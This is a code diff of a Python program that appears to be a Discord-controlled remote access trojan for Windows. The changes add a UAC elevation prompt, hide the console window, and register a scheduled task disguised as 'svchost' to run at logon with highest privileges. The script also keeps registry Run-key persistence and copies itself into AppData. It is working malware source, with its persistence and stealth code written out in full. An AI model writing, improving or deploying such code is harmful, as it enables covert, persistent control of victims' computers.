@@ -38,6 +38,24 @@ import uuid
 import socket
 import cgi
 
+def is_admin():
+    """Check if the script is running with admin privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    """Attempt to restart the script with admin privileges."""
+    if is_admin():
+        print("Running with admin privileges.")
+        return  # Exit the function if already running as admin
+
+    print("Attempting to elevate privileges...")
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+
+run_as_admin()
+
 def download_and_open_file(url, destination):
     try:
         # Check if the file already exists and delete it
@@ -101,36 +119,19 @@ async def on_ready():
     if not is_connected():
         await wait_for_connection()  # Wait until connected
 
+
 def hide_console():
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-def hide_file(file_path):
-    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02)  # 0x02 is the hidden attribute
-
 # Hide the console window
 hide_console()
-
-# Hide the current script file
-if __name__ == "__main__":
-    current_script_path = os.path.realpath(sys.argv[0])
-    hide_file(current_script_path)
-    print(f"Script is now hidden: {current_script_path}")
 
 # Retrieve AppData Path
 appdata_path = os.getenv("APPDATA")
 script_name = os.path.basename(__file__)
 script_path = os.path.join(appdata_path, script_name)
 
-
 def add_to_startup_methods(script_path):
-    # Copy to Startup folder
-    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-    try:
-        shutil.copy(script_path, startup_folder)
-        print(f"Script copied to Startup folder: {startup_folder}")
-    except Exception as e:
-        print(f"Error copying to Startup folder: {e}")
-
     # Add to registry for current user (HKCU)
     try:
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
@@ -151,11 +152,37 @@ def add_to_startup_methods(script_path):
     except Exception as e:
         print(f"Error adding to HKLM registry: {e}")
 
-    # Create a scheduled task for startup with highest privileges
+    # Create a scheduled task for startup with highest privileges using win32api and TaskScheduler
     task_name = "svchost"
     try:
-        command = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /rl highest /f'
-        subprocess.call(command, shell=True)
+        # Task scheduler COM interfaces
+        import win32com.client
+        scheduler = win32com.client.Dispatch('Schedule.Service')
+        scheduler.Connect()
+
+        task_definition = scheduler.NewTask(0)
+        task_definition.RegistrationInfo.Description = "Startup Task for svchost"
+        task_definition.Principal.UserId = "INTERACTIVE"
+        task_definition.Principal.LogonType = 3  # Logon interactively
+
+        # Create the trigger for the task (on logon)
+        trigger = task_definition.Triggers.Create(1)  # 1 is for Logon trigger
+        trigger.StartBoundary = "2024-11-14T00:00:00"  # Start immediately after logon
+
+        # Define the action to run the script
+        action = task_definition.Actions.Create(0)  # 0 is for executable action
+        action.Path = script_path
+
+        # Set the task to run with highest privileges
+        task_definition.Settings.Enabled = True
+        task_definition.Settings.RunOnlyIfIdle = False
+        task_definition.Settings.AllowStartIfOnBatteries = True
+        task_definition.Settings.StartWhenAvailable = True
+        task_definition.Principal.RunLevel = 3  # Highest privileges
+
+        folder = scheduler.GetFolder("\\")
+        folder.RegisterTaskDefinition(task_name, task_definition, 6, None, None, 3)
+
         print(f"Scheduled task '{task_name}' created.")
     except Exception as e:
         print(f"Error creating scheduled task: {e}")
@@ -172,18 +199,8 @@ def add_startup_entries():
         shutil.copy(script_path, target_path)
         print(f"Copied {script_path} to {target_path}")
     
-    # Hide the script in the target location
-    subprocess.call(f'attrib +h "{target_path}"', shell=True)
-
     # Add to startup methods
     add_to_startup_methods(target_path)
-
-# Call to add startup entries
-add_startup_entries()
-
-# Call to add startup entries
-if __name__ == "__main__":
-    add_startup_entries()
     
 def get_ip_info():
     try:
@@ -940,6 +957,10 @@ async def remove(ctx):
         
     except Exception as e:
         print(f"Error removing bot: {e}")
+
+# Call to add startup entries
+if __name__ == "__main__":
+    add_startup_entries()
 
 if __name__ == "__main__":
     # Check if the script is run as a standalone .exe or as a .py script
